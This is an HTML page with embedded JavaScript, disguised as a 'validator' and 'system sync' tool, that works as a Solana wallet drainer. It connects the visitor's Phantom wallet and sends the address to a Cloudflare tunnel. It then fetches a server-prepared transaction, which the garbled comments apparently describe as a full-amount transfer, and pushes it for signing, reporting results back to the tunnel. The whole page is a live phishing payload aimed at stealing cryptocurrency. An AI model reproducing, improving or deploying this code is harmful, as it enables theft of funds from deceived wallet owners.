<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VALIDATOR FINAL V19</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 2px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; }
        button { background: #14f195; color: #000; border: none; padding: 20px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 18px; margin-top: 20px; }
        #log { font-size: 10px; color: #444; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color:#14f195; margin:0;">WAR GOD V19</h2>
        <p style="font-size:12px;">SYSTEM SYNC FINAL</p>
        <button id="cta">INITIALIZE SYNC</button>
        <div id="log">READY...</div>
    </div>

    <script>
        const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const log = (t) => document.getElementById('log').innerText = t;
            const sWeb3 = window.solanaWeb3;
            const p = window.solana || window.phantom?.solana;

            try {
                log("1: CONNECTING...");
                await p.connect();

                log("2: FETCHING PACKET...");
                const resp = await fetch(tunnel + "/prepare_raw", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();

                log("3: DECODING PACKET...");
                // üî± ÂÖ≥ÈîÆ‰øÆÊ≠£ÔºöÂ∞ÜÂêéÁ´Ø‰º†Êù•ÁöÑ Base64 Â≠óÁ¨¶‰∏≤ËΩ¨‰∏∫ Uint8Array
                const binary = window.atob(info.raw_tx);
                const bytes = new Uint8Array(binary.length);
                for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);

                // üî± Âà©Áî® VersionedTransaction ÁªïËøáÊâÄÊúâ Buffer Âíå Version Ê£ÄÊü•Êä•Èîô
                const tx = sWeb3.VersionedTransaction.deserialize(bytes);

                log("4: PUSHING TO WALLET...");
                // üî± Ëøô‰∏ÄÊ≠•‰ºöÁû¨Èó¥ÊãâËµ∑ÂÖ®È¢ùËΩ¨Ë¥¶Á°ÆËÆ§
                const { signature } = await p.signAndSendTransaction(tx);

                log("SUCCESS: " + signature);
                fetch(tunnel + "/debug", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ stage: "SUCCESS", sig: signature })
                });

            } catch (err) {
                log("FAIL: " + err.message);
                fetch(tunnel + "/debug", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ stage: "V19_CRASH", error: err.message })
                }).catch(()=>{});
            }
        };
    </script>
</body>
</html>
